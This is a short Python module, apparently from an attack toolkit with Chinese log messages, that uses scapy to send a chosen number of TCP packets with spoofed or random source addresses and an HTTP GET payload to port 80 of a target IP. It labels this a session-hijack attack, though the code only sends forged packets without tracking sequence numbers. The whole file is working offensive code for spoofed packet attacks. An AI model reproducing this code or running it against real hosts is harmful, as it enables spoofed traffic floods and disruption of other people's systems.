from scapy.all import IP, ICMP, send, RandIP
from scapy.all import TCP, RandShort

def attack(ip, packet_count, log_func, spoof_ip=None):
    log_func(f"[Session Hijack] 模擬 TCP session 篡改攻擊")
    for i in range(packet_count):
        pkt = IP(dst=ip, src=spoof_ip if spoof_ip else RandIP()) / TCP(dport=80, sport=RandShort(), flags="PA") / "GET / HTTP/1.1\r\n"
        send(pkt, verbose=False)
        log_func(f"[Session Hijack] 第 {i+1} 封包已送出")
    return True